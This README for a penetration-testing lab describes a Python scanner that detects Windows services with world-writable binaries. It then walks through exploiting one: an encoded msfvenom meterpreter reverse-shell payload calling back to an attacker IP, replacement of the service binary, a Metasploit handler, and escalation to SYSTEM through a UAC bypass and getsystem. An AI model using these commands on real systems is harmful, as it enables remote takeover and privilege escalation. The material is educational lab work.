#  Windows Service Exploiter

**A Python-based scanner that identifies vulnerable Windows services with misconfigured binary permissions. This tool detects services with weak permissions allowing binary path replacement that could lead to a potential exploitation**

---

##  Features

- **Scans all services on the host**
- **Detects writable binary paths (`Everyone:(F)` / `Users:(F)`)**
- **Exports results to `vulnerable_services.csv` with timestamps**
- **Displays inline status for each service in terminal**
- **Logs to `service_exploit.log` for forensic traceability**

---

## Phase I: Detection
### Setup and working
1. **Windows machine (I used Windows 10 in controlled lab environment)**
2. [**Python 3.x**](https://www.python.org/downloads/windows/)
3. **pywin32** -- `pip install pywin32`
4. **Now to create a vulnerable test service I first created a dummy executable file test.exe in `C:\Temp`**![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Screensnips/testservice.png)
5. **`sc create TestService binPath= "C:\Temp\test.exe"`**
6. **`icacls "C:\Temp\test.exe" /grant Everyone:F`** **This command grants full controll to all users which is a potential exploit vector**![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Screensnips/testservice2.png)
7. **The [python service scanner](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/service_exploiter_windows.py) has to be run with admin privileges using CMD**
8. ****`python`** [service_exploiter_windows.py](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/service_exploiter_windows.py)**
9. ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Screensnips/exploitchecker.png) 
10. **The results of the scan is displayed as:** ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Screensnips/Results.png)
11. **The [service_exploit.log](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/service_exploit.log) and [vulnerable_services.csv](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/vulnerable_services.csv) will be saved**

## Phase II: Exploitation
### Working
1. **In this scenario if an attacker is aware of this vulnerable service running on the target, the attacker can easily exploit this service and gain access to the system. This is illustrated in following ways**
2. **Crafted a payload and encoded it with shikata_ga_nai using msfvenom**
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=1234 -e x/86/shikata_ga_nai -i 10 -f exe > payload.exe`![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Payload_and_share.png)
3. **Now the attacker can use phishing or any other techniques to send or copy the payload to the target**
4. **In my controlled environmet, I created share folder using `mkdir` and copied the payload to this share folder**
5. **I hosted the share folder on port 4444 using `python2 -m SimpleHTTPServer 4444`**
6. **I downloaded this payload from my target Windows 10 machine where the test service is running**![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Download_payload.png)
7. **As an attacker since I know the TestService is writable by all, I will simply overwrite test.exe with the payload that was downloaded with command `copy /Y payload.exe C:\Temp\test.exe`**
8. ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/wrapped_payload.png)
9. **So now when the the TestService is executed from the target machine, the payload will be simply executed**
10. **From my attacker machine I can open msfconsole and use `exploit/multi/handler`**
    ```bash
       msfconsole
       use exploit/multi/handler
       set payload windows/meterpreter/reverse_tcp //same payload option used in payload.exe
       set LHOST <attacker_IP>
       set LPORT 1234 //same port used in payload.exe**
       set SessionExpirationTimeout 0
       exploit
    ```
    ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/msfconsole.png)
11. **Now I will open cmd prompt as admin to execute TestService**
    `net start TestService`
    ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Service_start.png)
12. **Gained meterpreter session.**
    
     ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Meterpretersession.png)
13. **Additionally as a post exploitataion process, we can gain NT AUTHORITY\SYSTEM running `post/multi/recon/local_exploit_suggester` to find modules suitable for privilege escalation.**
    ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Postexploit.png)
14. **I used `exploit/windows/local/bypassuac_fodhelper` as the target appears to be vulnerable.**
    ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/Post.png)
15. **After running the exploit, I used `getsystem` to gain highest privilege on that target system.**
    ![](https://github.com/brindhasham/Lab_PT/blob/main/Windows%20Service%20Exploiter/Exploitation_Screensnips/NTAuthority.png)

    
### This demo just shows how a vulnerable service can be used by a threat actor to gain remote access to a target system. ###



